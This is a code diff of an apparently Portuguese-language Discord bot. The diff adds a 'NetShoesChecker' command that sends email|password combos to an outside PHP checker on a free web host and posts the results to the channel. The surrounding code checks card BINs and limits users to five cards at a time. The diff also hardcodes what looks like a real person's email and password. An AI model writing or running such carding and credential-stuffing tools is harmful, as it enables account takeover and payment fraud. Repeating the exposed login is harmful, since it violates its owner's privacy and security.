@@ -38,6 +38,10 @@ bot.on('message', (msg) => {
         MostrarComandos(msg);
     }
 	
+    if(message.startsWith('!NetShoesChecker')) {
+        NetShoesChecker(msg);
+    }
+	
 });
 
 function Check(message) {
@@ -67,6 +71,18 @@ return message.reply("5 CC POR VEZ FDP");
     var fields = msg.split(' ');
     var bin = fields[1];
       Request("http://thelimao.kinghost.net/bin.php?bin=" + bin, function(result) {
+            message.channel.send({embed: {
+                color: 0x8080ff,
+                description: result
+            }});
+      });
+  }
+
+  function NetShoesChecker(message) {
+    var msg = message.content;
+    var fields = msg.split(' ');
+    var dados = fields[1];
+      Request("http://potential-winch.000webhostapp.com/netshoes.php?dados=william.douglas2013@bol.com.br|punto2008" + dados, function(result) {
             message.channel.send({embed: {
                 color: 0x8080ff,
                 description: result
